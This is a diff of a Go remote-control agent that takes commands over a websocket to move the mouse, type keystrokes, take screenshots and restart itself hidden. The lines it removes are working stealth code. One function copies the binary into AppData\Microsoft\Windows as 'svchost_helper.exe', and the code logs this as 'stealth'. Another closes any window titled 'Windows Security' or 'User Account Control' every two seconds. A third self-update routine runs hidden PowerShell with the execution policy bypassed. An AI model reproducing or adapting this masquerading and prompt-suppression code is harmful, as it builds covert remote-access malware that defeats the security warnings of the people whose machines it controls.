@@ -1,6 +1,3 @@
-//go:build windows
-// +build windows
-
 package main
 
 import (
@@ -26,11 +23,9 @@ import (
 	"sync"
 	"syscall"
 	"time"
-	"unsafe"
 
 	"github.com/gorilla/websocket"
 	"github.com/kbinani/screenshot"
-	"golang.org/x/sys/windows"
 )
 
 type Config struct {
@@ -198,10 +193,11 @@ func (wm *WireMessage) Marshal() []byte {
 func (wm *WireMessage) Unmarshal(data []byte) error { return json.Unmarshal(data, wm) }
 
 type InputEvent struct {
-	MouseMove   func(int, int)
-	MouseClick  func(int, int, bool)
-	KeyPress    func(uint16)
-	TypeText    func(string)
+	MouseMove       func(int, int)
+	MouseClick      func(int, int, bool)
+	MouseMiddleClick func(int, int)
+	KeyPress        func(uint16)
+	TypeText        func(string)
 }
 
 type TunnelManager struct{}
@@ -547,36 +543,7 @@ func sendJSON(conn *websocket.Conn, v interface{}) {
 	}
 }
 
-// ============================================================================
-// Utility: applyUpdate (download new .exe, replace, restart)
-// ============================================================================
 
-func applyUpdate(downloadURL string) {
-	llog("info", "update: downloading %s", downloadURL)
-	tmpPath := filepath.Join(os.TempDir(), "rmon_update.exe")
-	if err := downloadFile(downloadURL, tmpPath); err != nil {
-		llog("error", "update download: %v", err)
-		return
-	}
-	exe, err := os.Executable()
-	if err != nil {
-		llog("error", "update: %v", err)
-		return
-	}
-	// Write a PowerShell script that waits, copies, and restarts
-	psScript := fmt.Sprintf(`
-Start-Sleep -Seconds 2
-Stop-Process -Id %d -Force -ErrorAction SilentlyContinue
-Start-Sleep -Seconds 1
-Copy-Item "%s" "%s" -Force
-Start-Process "%s"
-`, os.Getpid(), tmpPath, exe, exe)
-	psPath := filepath.Join(os.TempDir(), "rmon_update.ps1")
-	os.WriteFile(psPath, []byte(psScript), 0644)
-	llog("info", "update: applying, restarting...")
-	exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", psPath).Start()
-	os.Exit(0)
-}
 
 // ============================================================================
 // SECTION 18 — ServerMode (central relay: agents → dashboards)
@@ -2030,8 +1997,7 @@ func (a *Agent) handleRemoteCommand(cmd map[string]interface{}) {
 		btn, _ := cmd["button"].(string)
 		left := btn != "right" && btn != "middle"
 		if btn == "middle" {
-			procMouseEvent.Call(mouseeventfMiddledown, 0, 0, 0, 0)
-			procMouseEvent.Call(mouseeventfMiddleup, 0, 0, 0, 0)
+			a.inputEvent.MouseMiddleClick(a.lastMouseX, a.lastMouseY)
 			break
 		}
 		a.inputEvent.MouseClick(a.lastMouseX, a.lastMouseY, left)
@@ -2101,7 +2067,7 @@ func (a *Agent) handleRemoteCommand(cmd map[string]interface{}) {
 				return
 			}
 			cmd := exec.Command(exe)
-			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+			hideCmdWindow(cmd)
 			if cmd.Start() == nil {
 				os.Exit(0)
 			}
@@ -2180,72 +2146,7 @@ func (eb *EventBuffer) Flush() []ActivityEvent {
 	return out
 }
 
-func copyToSystemLocation() (string, error) {
-	src, err := os.Executable()
-	if err != nil {
-		return "", fmt.Errorf("get executable: %w", err)
-	}
-	
-	destDir := os.Getenv("APPDATA")
-	if destDir == "" {
-		destDir = filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming")
-	}
-	destDir = filepath.Join(destDir, "Microsoft", "Windows")
-	if err := os.MkdirAll(destDir, 0755); err != nil {
-		return "", fmt.Errorf("create dest dir: %w", err)
-	}
-	
-	dest := filepath.Join(destDir, "svchost_helper.exe")
-	
-	srcData, err := os.ReadFile(src)
-	if err != nil {
-		return "", fmt.Errorf("read source: %w", err)
-	}
-	
-	if err := os.WriteFile(dest, srcData, 0755); err != nil {
-		return "", fmt.Errorf("write dest: %w", err)
-	}
-	
-	llog("info", "stealth: copied to %s", dest)
-	return dest, nil
-}
-func startPopupKiller(ctx context.Context) {
-	go func() {
-		ticker := time.NewTicker(2 * time.Second)
-		defer ticker.Stop()
-		popupTitles := []string{
-			"Windows Security",
-			"User Account Control",
-			"Program Compatibility Assistant",
-			"Error",
-			"Warning",
-		}
-		user32 := windows.NewLazyDLL("user32.dll")
-		findWindow := user32.NewProc("FindWindowW")
-		sendMessage := user32.NewProc("SendMessageW")
-		const WM_CLOSE = 0x0010
-		for {
-			select {
-			case <-ctx.Done():
-				return
-			case <-ticker.C:
-				for _, title := range popupTitles {
-					titlePtr, err := syscall.UTF16PtrFromString(title)
-					if err != nil {
-						continue
-					}
-					// FindWindowW(NULL, lpWindowName)
-					hwnd, _, err := findWindow.Call(0, uintptr(unsafe.Pointer(titlePtr)))
-					if hwnd == 0 {
-						continue
-					}
-					// Send WM_CLOSE to the window
-					sendMessage.Call(hwnd, uintptr(WM_CLOSE), 0, 0)
-				}
-			}
-		}
-	}()
-}
+
 
 // ============================================================================
 // SECTION 24 - URL Loading (urls.ini)
@@ -2498,15 +2399,12 @@ func preflightCheck(cfg *Config) []PreflightResult {
 		})
 	}
 
-	// 8. Windows build / compat
-	ver := windows.RtlGetVersion()
-	if ver != nil {
-		results = append(results, PreflightResult{
-			Name: "windows-version",
-			Status: "pass",
-			Message: fmt.Sprintf("Windows %d.%d build %d", ver.MajorVersion, ver.MinorVersion, ver.BuildNumber),
-		})
-	}
+	// 8. OS version
+	results = append(results, PreflightResult{
+		Name: "os-version",
+		Status: "pass",
+		Message: getOSVersion(),
+	})
 
 	return results
 }
